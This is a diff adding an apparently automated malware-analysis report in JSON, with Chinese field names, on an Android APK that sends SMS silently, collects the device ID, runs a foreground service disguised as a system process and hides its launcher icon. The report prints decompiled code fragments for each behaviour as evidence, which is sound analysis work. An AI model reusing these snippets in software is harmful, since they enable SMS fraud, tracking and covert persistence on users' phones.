@@ -1,0 +1,148 @@
+{
+  "APK信息": {
+    "文件名": "20b433848f0f77a5ffb8ef2a6cbe6b3479879d02ff28a637d52cb6a1463babd5.apk",
+    "sha256": "20b433848f0f77a5ffb8ef2a6cbe6b3479879d02ff28a637d52cb6a1463babd5",
+    "包名": "ru.hunting.beneficiary",
+    "应用名": "СМC - Послaние",
+    "是否恶意": true,
+    "风险等级": "高",
+    "分析耗时(秒)": 117.3
+  },
+  "行为列表": [
+    {
+      "行为": "sms_fraud",
+      "中文名": "短信欺诈",
+      "MITRE": "T1416",
+      "置信度": "likely",
+      "子行为": [
+        {
+          "子行为": "sms_send",
+          "中文名": "短信发送",
+          "置信度": "likely",
+          "证据": {
+            "方法引用": [],
+            "权限": [
+              "android.permission.SEND_SMS"
+            ],
+            "字符串": [
+              "sendTextMessage"
+            ]
+          }
+        }
+      ],
+      "恶意代码": [
+        {
+          "class_path": "Lru\\hunting\\beneficiary\\c;",
+          "method_signature": "a(String str, String str2, PendingIntent pendingIntent)",
+          "malicious_behavior": "sms_fraud",
+          "behavior_type": "malicious",
+          "risk_level": "高",
+          "malicious_code_snippet": "SmsManager.getDefault().sendTextMessage(str, null, str2, pendingIntent, null);",
+          "malicious_code_snippet_context": "      public static void a(String str, String str2, PendingIntent pendingIntent) {\n          try {\n              Aquarium.a(true);\n>>>             SmsManager.getDefault().sendTextMessage(str, null, str2, pendingIntent, null);\n          } catch (Exception e) {\n          }\n      }",
+          "behavior_description": "代码通过 SmsManager.getDefault().sendTextMessage() 静默发送短信，目标号码和短信内容均来自方法参数 str 和 str2，发送过程无用户交互确认，异常被 catch 静默吞掉以隐藏痕迹。同时通过检查 SDK 版本和默认短信应用包名来规避 Android 4.4+ 的短信应用限制，属于典型的短信欺诈行为，可能导致用户被订阅付费服务或向C2回传数据。",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "device_fingerprinting",
+      "中文名": "设备指纹采集",
+      "MITRE": "T1437",
+      "置信度": "likely",
+      "证据": {
+        "方法引用": [],
+        "权限": [
+          "android.permission.READ_PHONE_STATE"
+        ],
+        "字符串": [
+          "ANDROID_ID"
+        ]
+      },
+      "恶意代码": [
+        {
+          "class_path": "Lru\\hunting\\beneficiary\\c;",
+          "method_signature": "c(Context context)",
+          "malicious_behavior": "device_fingerprinting",
+          "behavior_type": "grayware",
+          "risk_level": "中",
+          "malicious_code_snippet": "return Settings.Secure.getString(context.getContentResolver(), \"android_id\");",
+          "malicious_code_snippet_context": "      }\n  \n      public static String c(Context context) {\n>>>         return Settings.Secure.getString(context.getContentResolver(), \"android_id\");\n      }\n  \n      private static void c(Context context, long j) {",
+          "behavior_description": "代码通过 Settings.Secure.getString 获取设备的 android_id 唯一标识符，用于设备指纹采集和追踪。",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "persistence",
+      "中文名": "持久化",
+      "MITRE": "T1444",
+      "置信度": "suspected",
+      "子行为": [
+        {
+          "子行为": "foreground_service",
+          "中文名": "前台服务保活",
+          "置信度": "suspected",
+          "证据": {
+            "方法引用": [],
+            "权限": [],
+            "字符串": [
+              "startForeground"
+            ]
+          }
+        }
+      ],
+      "恶意代码": [
+        {
+          "class_path": "Lru\\hunting\\beneficiary\\AuditorSkip;",
+          "method_signature": "if(Build.VERSION.SDK_INT >= 26)",
+          "malicious_behavior": "persistence",
+          "behavior_type": "grayware",
+          "risk_level": "中",
+          "malicious_code_snippet": "if (Build.VERSION.SDK_INT >= 26) {\n    this.f2a.createNotificationChannel(new NotificationChannel(\"ru.hunting.beneficiary.RESOLUTION\", \"Rack\", 1));\n    builder = new Notification.Builder(getApplicationContext(), \"ru.hunting.beneficiary.RESOLUTION\");\n} else {\n    builder = new Notification.Builder(getApplicationContext());\n}\nbuilder.setContentTitle(\"Cиcтемный процесc\").setContentText(\"Сиcтемa не коррeктно работаeт, вaм неoбходимo включить дocтуп к cтaтистикe для 'Cиcтемный процесc'\");\nstartForeground(264, builder.build());",
+          "malicious_code_snippet_context": "  \n      private void a() {\n          Notification.Builder builder;\n>>>         if (Build.VERSION.SDK_INT >= 26) {\n>>>             this.f2a.createNotificationChannel(new NotificationChannel(\"ru.hunting.beneficiary.RESOLUTION\", \"Rack\", 1));\n>>>             builder = new Notification.Builder(getApplicationContext(), \"ru.hunting.beneficiary.RESOLUTION\");\n>>>         } else {\n>>>             builder = new Notification.Builder(getApplicationContext());\n>>>         }\n>>>         builder.setSmallIcon(R.drawable.ic_dialog_info).setContentTitle(\"Cиcтемный процесc\").setContentText(\"Сиcтемa не коррeктно работаeт, вaм неoбходимo включить дocтуп к cтaтистикe для 'Cиcтемный процесc'\").setWhen(System.currentTimeMillis());\n>>>         startForeground(264, builder.build());\n      }\n  \n      private void b() {",
+          "behavior_description": "代码通过创建通知渠道并构建伪装为“系统进程”的通知，调用startForeground启动前台服务以实现进程保活，同时诱导用户开启统计访问权限。",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "icon_hiding",
+      "中文名": "图标隐藏",
+      "MITRE": "",
+      "置信度": "suspected",
+      "证据": {
+        "方法引用": [],
+        "权限": [],
+        "字符串": [
+          "setComponentEnabledSetting"
+        ]
+      },
+      "恶意代码": [
+        {
+          "class_path": "Lru\\hunting\\beneficiary\\EqualPresidency;",
+          "method_signature": "a()",
+          "malicious_behavior": "icon_hiding",
+          "behavior_type": "malicious",
+          "risk_level": "中",
+          "malicious_code_snippet": "getPackageManager().setComponentEnabledSetting(new ComponentName(getApplicationContext(), EqualPresidency.class), 2, 1);",
+          "malicious_code_snippet_context": "  /* loaded from: classes.dex */\n  public class EqualPresidency extends Activity {\n      private void a() {\n>>>         getPackageManager().setComponentEnabledSetting(new ComponentName(getApplicationContext(), (Class<?>) EqualPresidency.class), 2, 1);\n      }\n  \n      @Override // android.app.Activity",
+          "behavior_description": "代码调用 setComponentEnabledSetting 将自身 Activity 组件设置为 DISABLED 状态(参数2=COMPONENT_ENABLED_STATE_DISABLED)，使应用图标从启动器中隐藏。该 Activity 在 onCreate 中立即执行隐藏操作并 finish 自身，用户安装后图标消失无法察觉，是恶意软件常用的隐蔽驻留手段。",
+          "glm_analyzed": true
+        }
+      ]
+    }
+  ],
+  "覆盖范围": {
+    "静态分析": "完整",
+    "动态分析": "未执行",
+    "方法引用分析": "完整",
+    "JADX反编译": "完整",
+    "LLM语义分析": "已执行",
+    "LLM交叉验证": "已执行",
+    "验证模型": "qwen3.7-plus",
+    "局限性": [
+      "C2服务器.是否活跃: 需动态分析",
+      "C2服务器.轮询间隔(秒): 需动态分析"
+    ]
+  }
+}
